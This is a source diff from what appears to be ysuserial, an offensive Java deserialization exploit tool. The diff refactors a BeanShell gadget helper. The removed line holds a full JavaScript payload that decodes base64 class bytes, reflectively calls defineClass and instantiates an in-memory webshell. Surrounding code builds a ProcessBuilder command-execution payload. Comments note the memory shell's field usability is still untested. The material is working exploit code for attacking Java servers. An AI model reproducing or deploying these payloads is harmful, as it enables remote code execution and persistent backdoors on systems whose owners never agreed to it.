@@ -1,4 +1,4 @@
-package org.su18.ysuserial.payloads.util.beanshell;
+package org.su18.ysuserial.payloads.util;
 
 import org.su18.ysuserial.Strings;
 
@@ -6,8 +6,7 @@ import java.util.Arrays;
 
 import static org.su18.ysuserial.payloads.config.Config.IS_INHERIT_ABSTRACT_TRANSLET;
 import static org.su18.ysuserial.payloads.util.Gadgets.*;
-import static org.su18.ysuserial.payloads.util.Utils.base64Encode;
-import static org.su18.ysuserial.payloads.util.Utils.handlerCommand;
+import static org.su18.ysuserial.payloads.util.Utils.*;
 
 /**
  * @author su18
@@ -35,7 +34,7 @@ public class BeanShellUtil {
 			// 在反序列化过程中会调用相关实现类的相关方法，可能用到 Interpreter 对象，报空指针
 			// 因此这里还是使用 ScriptEngineManager 一行就能写下的形式支持内存马，无需各种复杂写法
 			// 实战可用性有待测试
-			return "compare(Object su18, Object su19) {new javax.script.ScriptEngineManager().getEngineByName(\"JavaScript\").eval(\"var data = \\\"" + base64Encode(memShellClassBytes) + "\\\";var dataBytes=java.util.Base64.getDecoder().decode(data);var cloader= java.lang.Thread.currentThread().getContextClassLoader();var superLoader=cloader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();var method=superLoader.getDeclaredMethod(\\\"defineClass\\\",dataBytes.getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);method.setAccessible(true);var memClass=method.invoke(cloader,dataBytes,0,dataBytes.length);memClass.newInstance();\");return new Integer(1);}";
+			return "compare(Object su18, Object su19) {new javax.script.ScriptEngineManager().getEngineByName(\"JavaScript\").eval(\"" + getJSEngineValue(memShellClassBytes).replace("\"", "\\\"") + "\");return new Integer(1);}";
 		}
 
 		return "compare(Object su18, Object su19) {new java.lang.ProcessBuilder(new String[]{" +
